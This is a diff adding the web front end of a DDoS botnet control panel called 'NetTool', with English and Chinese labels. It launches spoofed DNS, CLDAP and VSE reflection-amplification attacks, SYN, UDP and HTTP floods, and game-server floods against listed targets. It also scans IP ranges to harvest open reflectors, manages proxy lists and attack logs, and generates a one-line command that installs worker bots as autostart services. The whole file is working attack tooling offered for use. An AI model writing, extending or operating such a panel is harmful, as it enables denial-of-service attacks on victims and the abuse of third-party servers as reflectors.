+      col_target:'Target', col_method:'Method', col_time:'Time', col_packets:'Packets', col_peak_pps:'Peak PPS',
+      stop:'Stop', completed:'Completed', fallback_udp:'Auto UDP fallback',
+    },
+    zh: {
+      login_title:'NetTool 认证', login_placeholder:'输入管理员令牌', login_btn:'登录',
+      logout:'退出', nodes_count:'节点: {0} | 任务: {1}',
+      live_stats:'实时统计', packets_sec:'包/秒', mb_sec:'MB/秒', total_packets:'总发包量', active_online:'活跃 {0} / 在线 {1}',
+      new_attack:'发起攻击',
+      method_combo:'组合攻击', method_vse:'VSE 放大攻击', method_vse_refl:'VSE 反射放大 (IP欺骗)', method_dns_refl:'DNS 反射放大 (IP欺骗)', method_cldap_refl:'CLDAP 反射放大 (IP欺骗)',
+      method_udp_stdhex:'UDP 标准Hex', method_udp_plain:'UDP 纯文本', method_udp_bypass:'UDP 绕过', method_udp_burst:'UDP 爆发',
+      method_tcp_syn:'TCP SYN', method_tcp_syn_spoof:'TCP SYN 伪造源IP (Linux)', method_tcp_ack:'TCP ACK', method_tcp_connect:'TCP 连接',
+      method_http:'HTTP 洪水', method_https:'HTTPS 绕过',
+      method_mc_handshake:'Minecraft 握手', method_mc_login:'Minecraft 登录', method_game_udp:'游戏 UDP 洪水',
+      group_udp:'UDP', group_tcp:'TCP', group_l7:'L7', group_game:'游戏',
+      game_none:'无游戏',
+      target_placeholder:'目标 (1.2.3.4:27015 或 URL) — 每行一个用于多目标',
+      duration:'持续时间 (秒)', threads:'线程数', pkt_size:'包大小', size:'大小',
+      pps_limit:'PPS限制 (0=关闭)', bps_limit:'BPS限制 (0=关闭)',
+      burst:'爆发', mix_queries:'混合查询', jitter_ms:'抖动(ms)',
+      start_attack:'开始攻击', templates:'模板', save:'保存', delete:'删除',
+      no_workers_warn:'没有工作节点连接。攻击将保持等待直到有节点加入。',
+      sub_attacks:'子攻击', add:'添加', no_sub_attacks:'暂无子攻击，点击 +添加 配置。',
+      vse_scanner:'VSE 反射器扫描', dns_scanner:'DNS 解析器扫描', cldap_scanner:'CLDAP 反射器扫描',
+      start_ip:'起始IP', end_ip:'结束IP', scan:'扫描', scanning:'扫描中...', attack:'攻击',
+      add_to_pool:'加入池', add_all_to_pool:'全部加入DNS池', add_all_to_cldap:'全部加入CLDAP池', resolvers_found:'个解析器发现', reflectors_found:'个反射器发现',
+      fofa_tips:'FOFA / Shodan 查询提示', cldap_export_tip:'导出格式选 IP:Port 列表，粘贴到 CLDAP 池页面批量添加并自动验证',
+      worker_nodes:'工作节点', tasks:'任务', steam_pool:'Steam 主池', manual_pool:'手动池',
+      force_refresh:'立即刷新', test_clean:'测试清理', testing:'测试中...',
+      manual_add_placeholder:'1.2.3.4:27015 (每行一个)',
+      proxy_manager:'代理管理', save_proxy:'保存代理文件', load_proxy:'从服务器加载',
+      dns_amp:'DNS 放大域名', dns_amp_hint:'输入大TXT记录(最大4096B)的域名。若填写则DNS验证使用此域名的TXT查询替代 isc.org。',
+      save:'保存',
+      quick_deploy:'快速上线', deploy_storage_ph:'云存储 URL (worker 二进制直链)', deploy_cmd_empty:'先设置存储 URL 并保存以生成命令',
+      deploy_proxy:'拉取 L7 代理 (-proxy)', deploy_install:'安装自启动服务 (-install)', deploy_daemon:'后台运行 (-daemon)',
+      deploy_tip:'命令自动拼接控制器地址 + worker 令牌。\n非 root 用户: -daemon 免 nohup 后台运行 (日志: data/worker.log)。\n-install 与 -daemon 互斥。',
+      attack_logs:'攻击日志', all_methods:'所有方法', export_csv:'导出CSV',
+      col_id:'ID', col_ip:'IP', col_os:'系统', col_cpu:'CPU', col_mem:'内存', col_location:'位置', col_status:'状态',
+      col_target:'目标', col_method:'方法', col_time:'时间', col_packets:'发包量', col_peak_pps:'峰值PPS',
+      stop:'停止', completed:'已完成', fallback_udp:'自动UDP回退',
+    }
+  };
+
+  return {
+    token:'', error:'', authed:false, lang:localStorage.getItem('lang')||'en',
+    nodes:[], tasks:[], totalPPS:0, totalMBps:0, totalPackets:0,
+    activeWorkers:0, onlineNodes:0, uptime:0, ws:null,
+    deployStorage:'', deployProxy:false, deployInstall:false, deployDaemon:false, deployCmd:'',
+    form:{ method:'vse', game:'', target:'', duration:60, threads:10, packet_size:1400, rate_limit_pps:0, rate_limit_bps:0, burst_mode:false, mix:false, jitter_ms:0, fallback_to_udp:true, sub_attacks:[] },
+    templates:[], selectedTemplate:'',
+    logs:[], logTotal:0, logFilter:'',
+    scan:{ startIP:'', endIP:'', port:27015, results:[], scanning:false, error:'' },
+    dnsScan:{ startIP:'', endIP:'', port:53, results:[], resultCount:0, scanning:false, error:'' },
+    cldapScan:{ startIP:'', endIP:'', port:389, results:[], resultCount:0, scanning:false, error:'' },
+    proxyData:'',
+    dnsAmpDomain:'',
+    steamList:[], steamCount:0, steamScanning:false, steamStatus:'',
+    manualList:[], manualCount:0, manualTesting:false, manualStatus:'', manualAddText:'',
+
+    t(key) {
+      let txt = (TR[this.lang]||TR.en)[key];
+      if (txt === undefined) return key;
+      return txt;
+    },
+
+    setLang(l) {
+      this.lang = l;
+      localStorage.setItem('lang', l);
+    },
+
+    init() {
+      const t = sessionStorage.getItem('token');
+      if (t) { this.token = t; this.doLogin(); }
+    },
+
+    async login() {
+      this.error = '';
+      try {
+        const r = await fetch('/api/auth', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token:this.token}) });
+        const data = await r.json();
+        if (data.success) { sessionStorage.setItem('token',data.token); this.authed=true; this.setupDashboard(); } else this.error = data.error || 'Invalid token';
+      } catch(e) { this.error = 'Connection failed'; }
+    },
+
+    async doLogin() {
+      try {
+        const r = await fetch('/api/auth', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token:this.token}) });
+        const data = await r.json();
+        if (data.success) { sessionStorage.setItem('token',data.token); this.authed=true; this.setupDashboard(); }
+      } catch(e) {}
+    },
+
+    setupDashboard() {
+      this.connectWS();
+      setInterval(() => { this.uptime++; this.fetchStats(); }, 1000);
+      this.fetchNodes(); this.fetchTasks(); this.loadProxy(); this.loadDNSAmp(); this.loadReflectors(); this.fetchTemplates(); this.fetchLogs(); this.loadDeploy();
+    },
+
+    getAuthHeaders() {
+      return { 'Content-Type':'application/json', 'Authorization':'Bearer '+(sessionStorage.getItem('token')||'') };
+    },
+
+    connectWS() {
+      const token = sessionStorage.getItem('token')||'';
+      const proto = location.protocol==='https:'?'wss:':'ws:';
+      this.ws = new WebSocket(proto+'//'+location.host+'/ws?token='+encodeURIComponent(token));
+      this.ws.onmessage = (e) => {
+        const msg = JSON.parse(e.data);
+        if (msg.type==='nodes') this.nodes = msg.data||[];
+        if (msg.type==='task_update'||msg.type==='task_created') this.fetchTasks();
+      };
+      this.ws.onclose = () => setTimeout(() => this.connectWS(), 2000);
+    },
+
+    async fetchNodes() { try { const r = await fetch('/api/nodes',{headers:this.getAuthHeaders()}); this.nodes = await r.json(); } catch(e) {} },
+    async fetchTasks() { try { const r = await fetch('/api/tasks',{headers:this.getAuthHeaders()}); this.tasks = await r.json(); } catch(e) {} },
+    async fetchStats() {
+      try { const r = await fetch('/api/stats',{headers:this.getAuthHeaders()}); const s = await r.json();
+        this.totalPPS=s.total_pps||0; this.totalMBps=(s.total_bps||0)/1048576; this.totalPackets=s.total_packets||0; this.activeWorkers=s.active_workers||0; this.onlineNodes=s.online_nodes||0;
+      } catch(e) {}
+    },
+
+    async startAttack() {
+      const payload = {...this.form};
+      const lines = (payload.target||'').split('\n').filter(l=>l.trim());
+      if (lines.length>1) { payload.targets = lines.map(l=>l.trim()).filter(l=>l); delete payload.target; }
+      if (payload.method==='combo') payload.sub_attacks = payload.sub_attacks||[];
+      await fetch('/api/tasks',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify(payload)});
+      this.fetchTasks();
+    },
+
+    async stopTask(id) { await fetch('/api/tasks/'+id+'/stop',{method:'POST',headers:this.getAuthHeaders()}); this.fetchTasks(); },
+
+    addSubAttack() {
+      if (!this.form.sub_attacks) this.form.sub_attacks = [];
+      this.form.sub_attacks.push({method:'vse_reflector',threads:100,packet_size:1400,rate_limit_pps:0,rate_limit_bps:0,game:'',burst_mode:false,jitter_ms:0});
+    },
+    removeSubAttack(idx) { this.form.sub_attacks.splice(idx,1); },
+
+    async startScan() {
+      this.scan.scanning=true; this.scan.results=[]; this.scan.error='';
+      try {
+        const isSingle = this.scan.startIP && this.scan.startIP===this.scan.endIP;
+        const body = isSingle?JSON.stringify({ip:this.scan.startIP,port:this.scan.port}):JSON.stringify({start_ip:this.scan.startIP,end_ip:this.scan.endIP,port:this.scan.port,concurrency:50});
+        const r = await fetch('/api/scan',{method:'POST',headers:this.getAuthHeaders(),body});
+        if (!r.ok) { const err = await r.json(); this.scan.error = err.error||'Scan failed'; }
+        else this.scan.results = await r.json();
+      } catch(e) { this.scan.error = 'Network error: '+e.message; }
+      this.scan.scanning=false;
+    },
+
+    async startDNSScan() {
+      this.dnsScan.scanning=true; this.dnsScan.results=[]; this.dnsScan.resultCount=0; this.dnsScan.error='';
+      try {
+        const isSingle = this.dnsScan.startIP && this.dnsScan.startIP===this.dnsScan.endIP;
+        const body = isSingle?JSON.stringify({ip:this.dnsScan.startIP,port:this.dnsScan.port}):JSON.stringify({start_ip:this.dnsScan.startIP,end_ip:this.dnsScan.endIP,port:this.dnsScan.port,concurrency:100,type:'dns'});
+        const r = await fetch('/api/scan',{method:'POST',headers:this.getAuthHeaders(),body});
+        const data = await r.json();
+        if (r.ok) { this.dnsScan.results=Array.isArray(data)?data:[]; this.dnsScan.resultCount=this.dnsScan.results.length; } else this.dnsScan.error=data.error||'Scan failed';
+      } catch(e) { this.dnsScan.error='Network error: '+e.message; }
+      this.dnsScan.scanning=false;
+    },
+
+    async addToDNSPool(r) { try { await fetch('/api/pools/dns/add',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify([r.ip+':'+r.port])}); } catch(e) {} },
+    async addAllToDNSPool() {
+      const entries = this.dnsScan.results.map(r=>r.ip+':'+r.port); if (!entries.length) return;
+      try { await fetch('/api/pools/dns/add',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify(entries)}); } catch(e) {}
+    },
+
+    async startCLDAPScan() {
+      this.cldapScan.scanning=true; this.cldapScan.results=[]; this.cldapScan.resultCount=0; this.cldapScan.error='';
+      try {
+        const isSingle = this.cldapScan.startIP && this.cldapScan.startIP===this.cldapScan.endIP;
+        const body = isSingle?JSON.stringify({ip:this.cldapScan.startIP,port:this.cldapScan.port}):JSON.stringify({start_ip:this.cldapScan.startIP,end_ip:this.cldapScan.endIP,port:this.cldapScan.port,concurrency:100,type:'cldap'});
+        const r = await fetch('/api/scan',{method:'POST',headers:this.getAuthHeaders(),body});
+        const data = await r.json();
+        if (r.ok) { this.cldapScan.results=Array.isArray(data)?data:[]; this.cldapScan.resultCount=this.cldapScan.results.length; } else this.cldapScan.error=data.error||'Scan failed';
+      } catch(e) { this.cldapScan.error='Network error: '+e.message; }
+      this.cldapScan.scanning=false;
+    },
+
+    async addToCLDAPPool(r) { try { await fetch('/api/pools/cldap/add',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify([r.ip+':'+r.port])}); } catch(e) {} },
+    async addAllToCLDAPPool() {
+      const entries = this.cldapScan.results.map(r=>r.ip+':'+r.port); if (!entries.length) return;
+      try { await fetch('/api/pools/cldap/add',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify(entries)}); } catch(e) {}
+    },
+
+    async loadProxy() { try { const r = await fetch('/api/proxy',{headers:this.getAuthHeaders()}); this.proxyData = await r.text(); } catch(e) {} },
+    async loadReflectors() {
+      try { const sr = await fetch('/api/reflectors/steam',{headers:this.getAuthHeaders()}); this.steamList = await sr.json(); this.steamCount = this.steamList.length; } catch(e) {}
+      try { const mr = await fetch('/api/reflectors/manual',{headers:this.getAuthHeaders()}); this.manualList = await mr.json(); this.manualCount = this.manualList.length; } catch(e) {}
+    },
+
+    async steamRefresh() {
+      this.steamScanning=true; this.steamStatus='Querying Steam Master + verifying...';
+      try { const r = await fetch('/api/reflectors/steam',{method:'POST',headers:this.getAuthHeaders()}); const d = await r.json();
+        this.steamStatus = 'Queried '+d.queried+', added '+d.added+', total '+d.total_pool; this.loadReflectors(); } catch(e) { this.steamStatus='Error: '+e.message; }
+      this.steamScanning=false;
+    },
+
+    async manualAdd() {
+      if (!this.manualAddText.trim()) return;
+      const lines = this.manualAddText.trim().split('\n').filter(l=>l.trim());
+      const refs = lines.map(l=>{ const [ip,port]=l.split(':'); return {ip,port:parseInt(port)||27015}; });
+      try { const r = await fetch('/api/reflectors/manual',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify(refs)}); const d = await r.json();
+        this.manualStatus='Added '+d.added+', total '+d.total; this.manualAddText=''; this.loadReflectors(); } catch(e) { this.manualStatus='Error: '+e.message; }
+    },
+
+    async manualDelete(ip,port) { await fetch('/api/reflectors/manual?ip='+ip+'&port='+port,{method:'DELETE',headers:this.getAuthHeaders()}); this.loadReflectors(); },
+
+    async manualTest() {
+      this.manualTesting=true; this.manualStatus='Testing all entries...';
+      try { const r = await fetch('/api/reflectors/manual/test',{method:'POST',headers:this.getAuthHeaders()}); const d = await r.json();
+        this.manualStatus='Test done. Remaining: '+d.total; this.loadReflectors(); } catch(e) { this.manualStatus='Error: '+e.message; }
+      this.manualTesting=false;
+    },
+
+    async saveProxy() { await fetch('/api/proxy',{method:'PUT',headers:this.getAuthHeaders(),body:this.proxyData}); },
+
+    async loadDeploy() {
+      try { const r = await fetch('/api/deploy/config',{headers:this.getAuthHeaders()}); const d = await r.json();
+        this.deployStorage = d.storage_url||''; this.buildDeployCmd(); } catch(e) {}
+    },
+    async saveDeploy() {
+      const r = await fetch('/api/deploy/config',{method:'PUT',headers:this.getAuthHeaders(),body:JSON.stringify({storage_url:this.deployStorage})});
+      const d = await r.json(); if (d.error) { alert(d.error); return; } this.buildDeployCmd();
+    },
+    toggleInstall() { if (this.deployInstall) this.deployDaemon = false; this.buildDeployCmd(); },
+    async buildDeployCmd() {
+      const addr = (location.hostname||'localhost')+':9090';
+      const params = new URLSearchParams({addr:addr});
+      if (this.deployProxy) params.set('proxy','1');
+      if (this.deployInstall) params.set('install','1');
+      if (this.deployDaemon) params.set('daemon','1');
+      try { const r = await fetch('/api/deploy/command?'+params.toString(),{headers:this.getAuthHeaders()}); const d = await r.json();
+        if (d.command) this.deployCmd = d.command; else this.deployCmd = ''; } catch(e) {}
+    },
+
+    async loadDNSAmp() { try { const r = await fetch('/api/dnsamp',{headers:this.getAuthHeaders()}); const d = await r.json(); this.dnsAmpDomain = d.domain||''; } catch(e) {} },
+    async saveDNSAmp() { await fetch('/api/dnsamp',{method:'PUT',headers:this.getAuthHeaders(),body:JSON.stringify({domain:this.dnsAmpDomain})}); },
+
+    taskPPS(t) { let total=0; if (t.workers) for (const w of Object.values(t.workers)) total+=w.current_pps||0; return total; },
+    taskMaxElapsed(t) { let max=0; if (t.workers) for (const w of Object.values(t.workers)) { if (w.elapsed_seconds>max) max=w.elapsed_seconds; } return max; },
+    taskProgress(t) { if (!t.duration) return 0; return Math.min(100,this.taskMaxElapsed(t)/t.duration*100); },
+    taskTimeLeft(t) { const left=(t.duration||0)-this.taskMaxElapsed(t); if (left<=0) return this.t('completed'); return Math.ceil(left)+'s remaining'; },
+
+    async fetchTemplates() { try { const r = await fetch('/api/templates',{headers:this.getAuthHeaders()}); this.templates = await r.json()||[]; } catch(e) {} },
+    async saveTemplate() { const name=prompt('Template name:'); if (!name) return; await fetch('/api/templates',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify({name,...this.form})}); this.fetchTemplates(); },
+    loadTemplate() {
+      const t = this.templates.find(x=>x.name===this.selectedTemplate); if (!t) return;
+      Object.assign(this.form,{method:t.method,game:t.game||'',target:(t.target||t.targets?.join('\n')||''),duration:t.duration,threads:t.threads,packet_size:t.packet_size,mix:t.mix,burst_mode:t.burst_mode,jitter_ms:t.jitter_ms,sub_attacks:t.sub_attacks||[]});
+    },
+    async deleteTemplate() { if (!this.selectedTemplate) return; if (!confirm('Delete template "'+this.selectedTemplate+'"?')) return;
+      await fetch('/api/templates?name='+encodeURIComponent(this.selectedTemplate),{method:'DELETE',headers:this.getAuthHeaders()}); this.selectedTemplate=''; this.fetchTemplates(); },
+
+    async exportCSV() {
+      try {
+        const r = await fetch('/api/logs/export',{headers:this.getAuthHeaders()});
+        if (!r.ok) { alert('Export failed: '+r.status); return; }
+        const blob = await r.blob();
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = 'attack_logs.csv';
+        document.body.appendChild(a); a.click(); a.remove();
+        URL.revokeObjectURL(url);
+      } catch(e) { alert('Export error: '+e.message); }
+    },
+
+    async fetchLogs() { try { const params = new URLSearchParams({limit:50}); if (this.logFilter) params.set('method',this.logFilter);
+      const r = await fetch('/api/logs?'+params.toString(),{headers:this.getAuthHeaders()}); const d = await r.json(); this.logs = d.logs||[]; this.logTotal = d.total||0; } catch(e) {} },
+
+    formatNum(n) { if (n>=1e6) return (n/1e6).toFixed(1)+'M'; if (n>=1e3) return (n/1e3).toFixed(1)+'K'; return String(n); },
+    isReflectorMethod(m) { return ['vse_reflector','dns_reflector','cldap_reflector'].includes(m); },
+    logout() { sessionStorage.removeItem('token'); location.reload(); }
+  }
+}
+</script>
+</body>
+</html>
